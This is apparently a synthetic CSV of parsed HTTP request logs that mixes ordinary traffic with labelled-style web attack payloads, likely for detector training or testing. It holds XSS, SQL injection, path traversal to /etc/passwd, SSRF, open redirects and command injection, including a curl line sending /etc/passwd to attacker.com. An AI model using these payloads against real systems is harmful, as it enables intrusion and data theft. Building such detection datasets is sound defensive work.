source_ip,timestamp,raw_url,scheme,host,port,effective_port,path,path_segments,path_depth,query_string,query_params,query_param_count,fragment,file_extension,method,status_code,user_agent,referrer,source
192.168.1.203,2026-04-07T07:48:25.296125,http://example.com/events,http,example.com,,80,/events,events,1,,,0,,,GET,,python-requests/2.31.0,,pcap
172.16.0.155,2026-04-07T07:48:25.297132,http://admin.example.com/fetch?target=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http,admin.example.com,,80,/fetch,fetch,1,target=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,target=http://[::1]/admin,1,,,GET,,burpsuite,,pcap
172.16.0.68,2026-04-07T07:48:25.297132,https://api.example.com/register,https,api.example.com,,443,/register,register,1,,,0,,,GET,,curl/8.4.0,,pcap
172.16.0.235,2026-04-07T07:48:25.298118,http://192.168.1.100/privacy?sort=asc&format=json,http,192.168.1.100,,80,/privacy,privacy,1,sort=asc&format=json,sort=asc;format=json,2,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.39,2026-04-07T07:48:25.298118,https://secure.example.com/search?query=<svg/onload=alert('XSS')>,https,secure.example.com,,443,/search,search,1,query=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E,query=<svg/onload=alert('XSS')>,1,,,GET,,sqlmap/1.7.12#dev,,pcap
172.16.0.134,2026-04-07T07:48:25.298118,http://test-app.local/api/v1/status?view=list&q=laptop,http,test-app.local,,80,/api/v1/status,api;v1;status,3,view=list&q=laptop,view=list;q=laptop,2,,,POST,,python-requests/2.31.0,,pcap
192.168.1.207,2026-04-07T07:48:25.299124,http://10.0.0.50/products?id=%27%20OR%20%27a%27%3D%27a,http,10.0.0.50,,80,/products,products,1,id=%27%20OR%20%27a%27%3D%27a,id=' OR 'a'='a,1,,,GET,,nuclei,,pcap
192.168.1.136,2026-04-07T07:48:25.299124,https://admin.example.com/api/user?user=admin%29%28%26%29,https,admin.example.com,,443,/api/user,api;user,2,user=admin%29%28%26%29,user=admin)(&),1,,,GET,,ZAP/2.14.0,,pcap
172.16.0.101,2026-04-07T07:48:25.299124,https://secure.example.com/products,https,secure.example.com,,443,/products,products,1,,,0,,,POST,,PostmanRuntime/7.35.0,,pcap
172.16.0.26,2026-04-07T07:48:25.299124,https://10.0.0.50/search?order=-1%27%20UNION%20SELECT%201%2C2%2C3--,https,10.0.0.50,,443,/search,search,1,order=-1%27%20UNION%20SELECT%201%2C2%2C3--,"order=-1' UNION SELECT 1,2,3--",1,,,POST,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.82,2026-04-07T07:48:25.300120,http://webapp.internal/download/../../../etc/passwd,http,webapp.internal,,80,/etc/passwd,etc;passwd,2,,,0,,,GET,,masscan/1.3,,pcap
192.168.1.24,2026-04-07T07:48:25.300120,http://test-app.local/download/..%252f..%252f..%252fetc/passwd,http,test-app.local,,80,/download/..%2f..%2f..%2fetc/passwd,download;..%2f..%2f..%2fetc;passwd,3,,,0,,,GET,,burpsuite,,pcap
192.168.1.9,2026-04-07T07:48:25.301097,https://test-app.local/api/orders,https,test-app.local,,443,/api/orders,api;orders,2,,,0,,,HEAD,,python-requests/2.31.0,,pcap
172.16.0.96,2026-04-07T07:48:25.301097,http://example.com/faq?limit=10,http,example.com,,80,/faq,faq,1,limit=10,limit=10,1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.166,2026-04-07T07:48:25.301097,https://example.com/blog/category/tech?from=2024-01-01&order=name,https,example.com,,443,/blog/category/tech,blog;category;tech,3,from=2024-01-01&order=name,from=2024-01-01;order=name,2,,,HEAD,,curl/8.4.0,,pcap
10.0.0.189,2026-04-07T07:48:25.301097,https://api.example.com/events?q=laptop&format=json&id=123,https,api.example.com,,443,/events,events,1,q=laptop&format=json&id=123,q=laptop;format=json;id=123,3,,,GET,,python-requests/2.31.0,,pcap
172.16.0.118,2026-04-07T07:48:25.302602,https://test-app.local/include?template=..%c0%af..%c0%af..%c0%afetc/passwd,https,test-app.local,,443,/include,include,1,template=..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BDetc%2Fpasswd,template=..��..��..��etc/passwd,1,,,GET,,Nmap Scripting Engine,,pcap
192.168.1.188,2026-04-07T07:48:25.302602,https://10.0.0.50/api/v1/health?to=2024-12-31&id=123,https,10.0.0.50,,443,/api/v1/health,api;v1;health,3,to=2024-12-31&id=123,to=2024-12-31;id=123,2,,,HEAD,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.183,2026-04-07T07:48:25.302602,https://secure.example.com/link?return=%2F%2Fevil.com%2F%252f..,https,secure.example.com,,443,/link,link,1,return=%2F%2Fevil.com%2F%2F..,return=//evil.com//..,1,,,GET,,ZAP/2.14.0,,pcap
192.168.1.168,2026-04-07T07:48:25.303585,http://webapp.internal/events?order=name&id=123&user=john,http,webapp.internal,,80,/events,events,1,order=name&id=123&user=john,order=name;id=123;user=john,3,,,GET,,curl/8.4.0,,pcap
192.168.1.123,2026-04-07T07:48:25.303585,https://shop.example.com/profile,https,shop.example.com,,443,/profile,profile,1,,,0,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.49,2026-04-07T07:48:25.303585,http://10.0.0.50/register,http,10.0.0.50,,80,/register,register,1,,,0,,,POST,,python-requests/2.31.0,,pcap
192.168.1.161,2026-04-07T07:48:25.304560,https://shop.example.com/register?brand=apple&q=laptop,https,shop.example.com,,443,/register,register,1,brand=apple&q=laptop,brand=apple;q=laptop,2,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.136,2026-04-07T07:48:25.304560,http://shop.example.com/faq,http,shop.example.com,,80,/faq,faq,1,,,0,,,POST,,PostmanRuntime/7.35.0,,pcap
172.16.0.150,2026-04-07T07:48:25.304560,http://webapp.internal/api/message?message=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,http,webapp.internal,,80,/api/message,api;message,2,message=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,"message=""><script>alert('XSS')</script>",1,,,POST,,wfuzz/3.1.0,,pcap
10.0.0.142,2026-04-07T07:48:25.304560,http://api.example.com/blog/post/1?from=2024-01-01&to=2024-12-31&status=active,http,api.example.com,,80,/blog/post/1,blog;post;1,3,from=2024-01-01&to=2024-12-31&status=active,from=2024-01-01;to=2024-12-31;status=active,3,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.98,2026-04-07T07:48:25.305537,http://shop.example.com/lookup?exec=test|,http,shop.example.com,,80,/lookup,lookup,1,exec=test%7C,exec=test|,1,,,POST,,gobuster/3.6,,pcap
10.0.0.95,2026-04-07T07:48:25.305537,https://shop.example.com/include?file=..%c0%af..%c0%af..%c0%afetc/passwd,https,shop.example.com,,443,/include,include,1,file=..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BDetc%2Fpasswd,file=..��..��..��etc/passwd,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.40,2026-04-07T07:48:25.305537,https://10.0.0.50/privacy?limit=10&view=list&q=laptop,https,10.0.0.50,,443,/privacy,privacy,1,limit=10&view=list&q=laptop,limit=10;view=list;q=laptop,3,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.106,2026-04-07T07:48:25.305537,http://192.168.1.100/dashboard?order=name,http,192.168.1.100,,80,/dashboard,dashboard,1,order=name,order=name,1,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.126,2026-04-07T07:48:25.305537,https://10.0.0.50/search?cn=admin%29%28%26%29,https,10.0.0.50,,443,/search,search,1,cn=admin%29%28%26%29,cn=admin)(&),1,,,GET,,burpsuite,,pcap
10.0.0.40,2026-04-07T07:48:25.307040,http://webapp.internal/privacy,http,webapp.internal,,80,/privacy,privacy,1,,,0,,,HEAD,,python-requests/2.31.0,,pcap
172.16.0.203,2026-04-07T07:48:25.307040,http://api.example.com/faq,http,api.example.com,,80,/faq,faq,1,,,0,,,GET,,curl/8.4.0,,pcap
10.0.0.17,2026-04-07T07:48:25.307040,http://example.com/read?doc=php://filter/convert.base64-encode/resource=index.php,http,example.com,,80,/read,read,1,doc=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php,doc=php://filter/convert.base64-encode/resource=index.php,1,,,GET,,masscan/1.3,,pcap
192.168.1.168,2026-04-07T07:48:25.308022,http://10.0.0.50/api/products?brand=apple,http,10.0.0.50,,80,/api/products,api;products,2,brand=apple,brand=apple,1,,,POST,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.200,2026-04-07T07:48:25.308022,http://api.example.com/products?user=',http,api.example.com,,80,/products,products,1,user=%27,user=',1,,,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.70,2026-04-07T07:48:25.308022,http://test-app.local/notifications?lang=en&page=1,http,test-app.local,,80,/notifications,notifications,1,lang=en&page=1,lang=en;page=1,2,,,GET,,PostmanRuntime/7.35.0,,pcap
172.16.0.87,2026-04-07T07:48:25.309003,https://example.com/index.html,https,example.com,,443,/index.html,index.html,1,,,0,,html,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.114,2026-04-07T07:48:25.309003,https://api.example.com/load?target=http%3A%2F%2Flocaltest.me%2F,https,api.example.com,,443,/load,load,1,target=http%3A%2F%2Flocaltest.me%2F,target=http://localtest.me/,1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.62,2026-04-07T07:48:25.309981,https://webapp.internal/lookup?ip=test&,https,webapp.internal,,443,/lookup,lookup,1,ip=test,ip=test,1,,,GET,,python-requests/2.31.0,,pcap
192.168.1.96,2026-04-07T07:48:25.309981,http://api.example.com/news,http,api.example.com,,80,/news,news,1,,,0,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.154,2026-04-07T07:48:25.309981,http://10.0.0.50/api/products?limit=10&sort=asc&from=2024-01-01,http,10.0.0.50,,80,/api/products,api;products,2,limit=10&sort=asc&from=2024-01-01,limit=10;sort=asc;from=2024-01-01,3,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.63,2026-04-07T07:48:25.310956,http://secure.example.com/help,http,secure.example.com,,80,/help,help,1,,,0,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.186,2026-04-07T07:48:25.310956,https://secure.example.com/tools?run=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,https,secure.example.com,,443,/tools,tools,1,run=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,run=test; curl http://attacker.com/exfil?data=$(cat /etc/passwd),1,,,POST,,sqlmap/1.7.12#dev,,pcap
172.16.0.187,2026-04-07T07:48:25.310956,https://secure.example.com/search?id=%27%20OR%20%27x%27%3D%27x,https,secure.example.com,,443,/search,search,1,id=%27%20OR%20%27x%27%3D%27x,id=' OR 'x'='x,1,,,GET,,nuclei,,pcap
10.0.0.139,2026-04-07T07:48:25.310956,https://10.0.0.50/ping?ip=test;,https,10.0.0.50,,443,/ping,ping,1,ip=test%3B,ip=test;,1,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.247,2026-04-07T07:48:25.311934,http://example.com/lookup?cmd=test;,http,example.com,,80,/lookup,lookup,1,cmd=test%3B,cmd=test;,1,,,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.25,2026-04-07T07:48:25.311934,http://test-app.local/api/message?name=<input,http,test-app.local,,80,/api/message,api;message,2,name=%3Cinput,name=<input,1,,,GET,,masscan/1.3,,pcap
192.168.1.85,2026-04-07T07:48:25.311934,http://shop.example.com/tools?exec=test$(cat,http,shop.example.com,,80,/tools,tools,1,exec=test%24%28cat,exec=test$(cat,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.196,2026-04-07T07:48:25.312937,http://webapp.internal/api/execute?target=test$(sleep,http,webapp.internal,,80,/api/execute,api;execute,2,target=test%24%28sleep,target=test$(sleep,1,,,POST,,python-requests/2.31.0,,pcap
10.0.0.168,2026-04-07T07:48:25.312937,https://example.com/url?target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,https,example.com,,443,/url,url,1,target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,target=/redirect?url=http://evil.com,1,,,GET,,gobuster/3.6,,pcap
172.16.0.69,2026-04-07T07:48:25.312937,http://admin.example.com/include?page=C:\Windows\System32\drivers\etc\hosts,http,admin.example.com,,80,/include,include,1,page=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts,page=C:\Windows\System32\drivers\etc\hosts,1,,,GET,,masscan/1.3,,pcap
10.0.0.127,2026-04-07T07:48:25.313923,https://secure.example.com/comment?query=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,https,secure.example.com,,443,/comment,comment,1,query=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,query=<img src=1 onerror=alert(1)>,1,,,POST,,wfuzz/3.1.0,,pcap
192.168.1.81,2026-04-07T07:48:25.313923,http://webapp.internal/news,http,webapp.internal,,80,/news,news,1,,,0,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.111,2026-04-07T07:48:25.313923,http://secure.example.com/checkout?q=laptop,http,secure.example.com,,80,/checkout,checkout,1,q=laptop,q=laptop,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.58,2026-04-07T07:48:25.314897,http://192.168.1.100/notifications?format=json,http,192.168.1.100,,80,/notifications,notifications,1,format=json,format=json,1,,,HEAD,,PostmanRuntime/7.35.0,,pcap
10.0.0.221,2026-04-07T07:48:25.314897,http://test-app.local/notifications,http,test-app.local,,80,/notifications,notifications,1,,,0,,,GET,,python-requests/2.31.0,,pcap
10.0.0.202,2026-04-07T07:48:25.314897,https://admin.example.com/redirect?url=https%3A%2F%2Fevil.com,https,admin.example.com,,443,/redirect,redirect,1,url=https%3A%2F%2Fevil.com,url=https://evil.com,1,,,GET,,burpsuite,,pcap
172.16.0.186,2026-04-07T07:48:25.315874,http://test-app.local/events?status=active&q=laptop&user=john,http,test-app.local,,80,/events,events,1,status=active&q=laptop&user=john,status=active;q=laptop;user=john,3,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.37,2026-04-07T07:48:25.315874,http://192.168.1.100/fetch?fetch=http%3A%2F%2F0x7f000001%2F,http,192.168.1.100,,80,/fetch,fetch,1,fetch=http%3A%2F%2F0x7f000001%2F,fetch=http://0x7f000001/,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.94,2026-04-07T07:48:25.315874,http://test-app.local/api/fetch?fetch=http%3A%2F%2Flocaltest.me%2F,http,test-app.local,,80,/api/fetch,api;fetch,2,fetch=http%3A%2F%2Flocaltest.me%2F,fetch=http://localtest.me/,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.254,2026-04-07T07:48:25.316880,http://example.com/index.html?page=1&lang=en&sort=asc,http,example.com,,80,/index.html,index.html,1,page=1&lang=en&sort=asc,page=1;lang=en;sort=asc,3,,html,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.118,2026-04-07T07:48:25.316880,https://shop.example.com/notifications,https,shop.example.com,,443,/notifications,notifications,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.8,2026-04-07T07:48:25.316880,https://secure.example.com/css/style.css,https,secure.example.com,,443,/css/style.css,css;style.css,2,,,0,,css,POST,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.214,2026-04-07T07:48:25.316880,http://secure.example.com/return?next=%2F%2Fevil.com%2Fpath,http,secure.example.com,,80,/return,return,1,next=%2F%2Fevil.com%2Fpath,next=//evil.com/path,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.163,2026-04-07T07:48:25.318840,http://10.0.0.50/download/file:///etc/passwd,http,10.0.0.50,,80,/download/file:/etc/passwd,download;file:;etc;passwd,4,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.223,2026-04-07T07:48:25.318840,http://secure.example.com/privacy,http,secure.example.com,,80,/privacy,privacy,1,,,0,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.2,2026-04-07T07:48:25.319817,http://example.com/api/execute?target=test|,http,example.com,,80,/api/execute,api;execute,2,target=test%7C,target=test|,1,,,GET,,sqlmap/1.7.12#dev,,pcap
192.168.1.192,2026-04-07T07:48:25.319817,https://192.168.1.100/directory?uid=admin%2A,https,192.168.1.100,,443,/directory,directory,1,uid=admin%2A,uid=admin*,1,,,GET,,burpsuite,,pcap
172.16.0.91,2026-04-07T07:48:25.319817,http://10.0.0.50/about,http,10.0.0.50,,80,/about,about,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.72,2026-04-07T07:48:25.320792,http://example.com/faq,http,example.com,,80,/faq,faq,1,,,0,,,GET,,curl/8.4.0,,pcap
